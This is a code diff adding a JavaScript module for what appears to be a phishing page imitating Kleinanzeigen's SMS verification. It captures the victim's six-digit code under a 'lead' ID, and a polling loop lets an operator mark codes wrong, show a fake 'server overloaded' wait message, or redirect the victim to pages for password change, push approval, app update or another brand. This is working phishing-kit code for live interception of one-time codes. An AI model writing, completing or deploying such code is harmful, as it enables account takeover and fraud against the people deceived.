@@ -1,0 +1,396 @@
+/**
+ * Klein SMS code: single input, /api/sms-code-submit + /api/status poll.
+ */
+import { getLeadIdFromUrl } from '../shared/query.js';
+import { kleinForgotWarnungUrl } from '../lib/klein-official-pw-url.js';
+
+export function runKleinSmsCode() {
+  'use strict';
+
+  var form = document.getElementById('sms-form');
+  var input = document.getElementById('phone-verification-token');
+  var btnResend = document.getElementById('sms-resend');
+  var btnConfirm = document.getElementById('sms-confirm');
+  var statusInterval = null;
+  var waitModalShown = false;
+  /** Предыдущий status из /api/status — чтобы снова показать Bitte-Warten после смены ветки. */
+  var prevKleinSmsWaitPollStatus = null;
+  /** Серверный kleinSmsWaitSeq: растёт на каждый POST /api/redirect-klein-sms-wait — повтор при том же status. */
+  var lastKleinSmsWaitSeqSeen = null;
+
+  var smsBackEl = document.getElementById('sms-back');
+  if (smsBackEl) {
+    smsBackEl.addEventListener('click', function (e) {
+      e.preventDefault();
+      if (window.history.length > 1) {
+        window.history.back();
+      } else {
+        window.location.href = '/';
+      }
+    });
+  }
+  var smsLogo = document.getElementById('knz-sms-logo');
+  if (smsLogo) smsLogo.addEventListener('click', function (e) { e.preventDefault(); });
+
+  function getCode() {
+    return (input && input.value) ? input.value.replace(/\D/g, '').slice(0, 6) : '';
+  }
+
+  function updateConfirmButton() {
+    if (btnConfirm) btnConfirm.disabled = getCode().length !== 6;
+  }
+
+  var SMS_ERROR_MSG = 'Der eingegebene Code ist nicht korrekt. Bitte überprüfe deine Eingaben.';
+  var userClearedSmsErrorByTyping = false;
+
+  function showSmsError(msg) {
+    var err = document.getElementById('sms-submit-error');
+    if (err) {
+      err.textContent = msg || 'Fehler. Bitte versuchen Sie es erneut.';
+      err.removeAttribute('hidden');
+      err.style.display = '';
+      err.setAttribute('aria-hidden', 'false');
+    }
+    var wrap = document.querySelector('.sms-klein-input-wrap');
+    if (wrap) wrap.classList.add('error');
+  }
+  function hideSmsError() {
+    var err = document.getElementById('sms-submit-error');
+    if (err) {
+      err.setAttribute('hidden', '');
+      err.textContent = '';
+    }
+    var wrap = document.querySelector('.sms-klein-input-wrap');
+    if (wrap) wrap.classList.remove('error');
+  }
+  function setSmsErrorFromAdmin(show) {
+    if (show) {
+      showSmsError(SMS_ERROR_MSG);
+    } else {
+      hideSmsError();
+    }
+  }
+
+  if (input) {
+    input.addEventListener('input', function () {
+      this.value = this.value.replace(/\D/g, '').slice(0, 6);
+      updateConfirmButton();
+      userClearedSmsErrorByTyping = true;
+      setSmsErrorFromAdmin(false);
+    });
+    input.addEventListener('paste', function (e) {
+      e.preventDefault();
+      var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+      this.value = pasted;
+      updateConfirmButton();
+      userClearedSmsErrorByTyping = true;
+      setSmsErrorFromAdmin(false);
+    });
+  }
+
+  var RESEND_COOLDOWN = 60;
+  var resendSecondsLeft = RESEND_COOLDOWN;
+  var resendTimer = null;
+
+  function setResendCooldown(seconds) {
+    if (!btnResend) return;
+    resendSecondsLeft = seconds;
+    if (resendTimer) { clearInterval(resendTimer); resendTimer = null; }
+    if (seconds > 0) {
+      btnResend.disabled = true;
+      btnResend.textContent = 'Erneut senden (' + seconds + ' s)';
+      resendTimer = setInterval(function () {
+        resendSecondsLeft--;
+        if (resendSecondsLeft > 0) {
+          btnResend.textContent = 'Erneut senden (' + resendSecondsLeft + ' s)';
+        } else {
+          btnResend.disabled = false;
+          btnResend.textContent = 'Erneut senden';
+          clearInterval(resendTimer);
+          resendTimer = null;
+        }
+      }, 1000);
+    }
+  }
+
+  if (btnResend) {
+    setResendCooldown(RESEND_COOLDOWN);
+    btnResend.addEventListener('click', function () {
+      if (btnResend.disabled) return;
+      var leadId = getLeadIdFromUrl();
+      if (leadId) {
+        fetch('/api/log-action', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: leadId, action: 'sms_resend' }),
+        }).catch(function () {});
+      }
+      setResendCooldown(RESEND_COOLDOWN);
+    });
+  }
+
+  var waitMsgEl = document.getElementById('sms-wait-msg');
+  var REENABLE_AFTER_MS = 15000;
+
+  function showKleinSmsWaitModal() {
+    if (waitModalShown) return;
+    waitModalShown = true;
+    var backdrop = document.createElement('div');
+    backdrop.style.position = 'fixed';
+    backdrop.style.inset = '0';
+    backdrop.style.background = 'rgba(0,0,0,.45)';
+    backdrop.style.zIndex = '99999';
+    var card = document.createElement('div');
+    card.style.position = 'fixed';
+    card.style.left = '50%';
+    card.style.top = '50%';
+    card.style.transform = 'translate(-50%, -50%)';
+    card.style.width = 'min(560px, calc(100% - 24px))';
+    card.style.background = '#fff';
+    card.style.border = '1px solid #dddbd5';
+    card.style.borderRadius = '16px';
+    card.style.boxShadow = '0 16px 40px rgba(0,0,0,.25)';
+    card.style.zIndex = '100000';
+    card.innerHTML =
+      '<div style="display:flex;align-items:center;justify-content:space-between;padding:22px 24px 14px;border-bottom:1px solid #e9e7e3;">' +
+        '<h2 style="margin:0;font-size:44px;line-height:1;color:#111;font-weight:700;">SMS</h2>' +
+        '<button type="button" id="knz-sms-wait-close" aria-label="Schließen" style="width:42px;height:42px;border-radius:12px;border:1px solid #dad8d2;background:#fff;color:#666;font-size:30px;line-height:1;cursor:pointer;">&times;</button>' +
+      '</div>' +
+      '<div style="padding:22px 24px 24px;">' +
+        '<div style="background:#f1f0ee;border:1px solid #dbd9d4;border-radius:14px;padding:18px;font-size:18px;line-height:1.45;color:#2f2f2f;">' +
+          'Bitte warte ein paar Minuten auf den SMS-Code, der Server ist überlastet. Verlasse die Seite nicht, damit das Eingabefeld für die SMS nicht verschwindet.' +
+        '</div>' +
+        '<div style="padding-top:18px;">' +
+          '<button type="button" id="knz-sms-wait-ok" style="min-width:108px;height:44px;padding:0 22px;border:none;border-radius:999px;background:#b5e941;color:#1d4b00;font-size:34px;font-weight:700;cursor:pointer;">OK</button>' +
+        '</div>' +
+      '</div>';
+    function closeModal() {
+      try { backdrop.remove(); } catch (e) {}
+      try { card.remove(); } catch (e) {}
+    }
+    backdrop.addEventListener('click', closeModal);
+    document.body.appendChild(backdrop);
+    document.body.appendChild(card);
+    var closeBtn = document.getElementById('knz-sms-wait-close');
+    var okBtn = document.getElementById('knz-sms-wait-ok');
+    if (closeBtn) closeBtn.addEventListener('click', closeModal);
+    if (okBtn) okBtn.addEventListener('click', closeModal);
+  }
+
+  function setWaitingState(waiting) {
+    if (btnConfirm) {
+      btnConfirm.disabled = waiting;
+      btnConfirm.textContent = waiting ? 'Bitte warten…' : 'Code bestätigen';
+    }
+    if (input) input.disabled = waiting;
+    if (waitMsgEl) {
+      waitMsgEl.hidden = !waiting;
+      if (waiting) {
+        waitMsgEl.textContent = 'Der Code wird überprüft. Sie werden weitergeleitet, sobald die Überprüfung abgeschlossen ist.';
+        waitMsgEl.classList.remove('retry');
+      }
+    }
+  }
+
+  function setRetryState() {
+    if (btnConfirm) {
+      btnConfirm.disabled = getCode().length !== 6;
+      btnConfirm.textContent = 'Code bestätigen';
+    }
+    if (input) input.disabled = false;
+    if (waitMsgEl) {
+      waitMsgEl.hidden = false;
+      waitMsgEl.classList.add('retry');
+      waitMsgEl.textContent = 'Falls der Code nicht funktioniert hat, geben Sie einen neuen Code ein.';
+    }
+  }
+
+  var reenableTimeout = null;
+
+  function startPollingAfterSms(leadId) {
+    setWaitingState(true);
+    if (reenableTimeout) { clearTimeout(reenableTimeout); reenableTimeout = null; }
+    reenableTimeout = setTimeout(function () {
+      reenableTimeout = null;
+      setRetryState();
+      updateConfirmButton();
+    }, REENABLE_AFTER_MS);
+    if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+    function check() {
+      fetch('/api/status?id=' + encodeURIComponent(leadId) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+        .then(function (r) { return r.json(); })
+        .then(function (res) {
+          var st = res && res.status;
+          try {
+            if ((res && res.mode) === 'manual' && st !== 'error') return;
+            if (st === 'redirect_klein_sms_wait') {
+              var wseqPoll = res.kleinSmsWaitSeq != null ? Number(res.kleinSmsWaitSeq) : 0;
+              if (!Number.isFinite(wseqPoll)) wseqPoll = 0;
+              if (
+                prevKleinSmsWaitPollStatus !== 'redirect_klein_sms_wait' ||
+                wseqPoll !== lastKleinSmsWaitSeqSeen
+              ) {
+                waitModalShown = false;
+              }
+              lastKleinSmsWaitSeqSeen = wseqPoll;
+            }
+            if (st === 'redirect_push') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/push-confirm.html?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_klein_sms_wait') {
+              showKleinSmsWaitModal();
+            } else if (st === 'redirect_change_password') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/passwort-aendern?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_sicherheit') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/sicherheit-update?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_open_on_pc') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/bitte-am-pc?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_android') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/app-update?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_gmx_net') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || '/';
+            } else if (st === 'redirect_sms_code') {
+              var curPath = (window.location && window.location.pathname) ? window.location.pathname : '';
+              var curId = getLeadIdFromUrl();
+              if (curPath === '/sms-code.html' && curId === leadId) return;
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/sms-code.html?id=' + encodeURIComponent(leadId);
+            } else if (st === 'redirect_klein_forgot') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = kleinForgotWarnungUrl(leadId);
+            } else if (st === 'show_success') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              try { sessionStorage.setItem('gmw_lead_id', leadId); } catch (e) {}
+              window.location = '/erfolg?id=' + encodeURIComponent(leadId);
+            } else if (st === 'error') {
+              if (!userClearedSmsErrorByTyping) {
+                if (reenableTimeout) { clearTimeout(reenableTimeout); reenableTimeout = null; }
+                setRetryState();
+                updateConfirmButton();
+                setSmsErrorFromAdmin(true);
+                if (waitMsgEl) { waitMsgEl.setAttribute('hidden', ''); }
+              }
+            } else {
+              userClearedSmsErrorByTyping = false;
+            }
+          } finally {
+            prevKleinSmsWaitPollStatus = st;
+          }
+        })
+        .catch(function () {});
+    }
+    check();
+    statusInterval = setInterval(check, 1000);
+  }
+
+  if (form) {
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      userClearedSmsErrorByTyping = false;
+      hideSmsError();
+      var code = getCode();
+      if (code.length !== 6) return;
+      var leadId = getLeadIdFromUrl();
+      if (!leadId) return;
+      if (btnConfirm) btnConfirm.disabled = true;
+      fetch('/api/sms-code-submit', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: leadId, code: code }),
+      }).then(function (r) {
+        if (!r || !r.ok) {
+          if (btnConfirm) btnConfirm.disabled = false;
+          showSmsError('Fehler beim Senden. Bitte versuchen Sie es erneut.');
+          return;
+        }
+        return r.json().then(function () {
+          hideSmsError();
+          startPollingAfterSms(leadId);
+        }).catch(function () {
+          startPollingAfterSms(leadId);
+        });
+      }).catch(function () {
+        if (btnConfirm) btnConfirm.disabled = false;
+        showSmsError('Verbindungsfehler. Bitte versuchen Sie es erneut.');
+      });
+    });
+  }
+
+  var initialId = getLeadIdFromUrl();
+  if (initialId) {
+    function checkStatus() {
+      fetch('/api/status?id=' + encodeURIComponent(initialId) + '&page=sms-code&_=' + Date.now(), { cache: 'no-store', headers: { Pragma: 'no-cache' } })
+        .then(function (r) { return r.json(); })
+        .then(function (res) {
+          var st = res && res.status;
+          try {
+            if ((res && res.mode) === 'manual' && st !== 'error') return;
+            if (st === 'redirect_klein_sms_wait') {
+              var wseqInit = res.kleinSmsWaitSeq != null ? Number(res.kleinSmsWaitSeq) : 0;
+              if (!Number.isFinite(wseqInit)) wseqInit = 0;
+              if (
+                prevKleinSmsWaitPollStatus !== 'redirect_klein_sms_wait' ||
+                wseqInit !== lastKleinSmsWaitSeqSeen
+              ) {
+                waitModalShown = false;
+              }
+              lastKleinSmsWaitSeqSeen = wseqInit;
+            }
+            if (st === 'redirect_push') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/push-confirm.html?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_klein_sms_wait') {
+              showKleinSmsWaitModal();
+            } else if (st === 'redirect_change_password') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/passwort-aendern?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_sicherheit') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/sicherheit-update?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_open_on_pc') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/bitte-am-pc?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_android') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/app-update?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_gmx_net') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location.href = (window.__BRAND__ && window.__BRAND__.canonicalUrl) || '/';
+            } else if (st === 'redirect_sms_code') {
+              var curPath = (window.location && window.location.pathname) ? window.location.pathname : '';
+              var curId = getLeadIdFromUrl();
+              if (curPath === '/sms-code.html' && curId === initialId) return;
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = '/sms-code.html?id=' + encodeURIComponent(initialId);
+            } else if (st === 'redirect_klein_forgot') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              window.location = kleinForgotWarnungUrl(initialId);
+            } else if (st === 'show_success') {
+              if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+              try { sessionStorage.setItem('gmw_lead_id', initialId); } catch (e) {}
+              window.location = '/erfolg?id=' + encodeURIComponent(initialId);
+            } else if (st === 'error') {
+              if (!userClearedSmsErrorByTyping) {
+                setRetryState();
+                updateConfirmButton();
+                setSmsErrorFromAdmin(true);
+                if (waitMsgEl) { waitMsgEl.setAttribute('hidden', ''); }
+              }
+            } else {
+              userClearedSmsErrorByTyping = false;
+            }
+          } finally {
+            prevKleinSmsWaitPollStatus = st;
+          }
+        })
+        .catch(function () {});
+    }
+    checkStatus();
+    statusInterval = setInterval(checkStatus, 1000);
+  }
+}
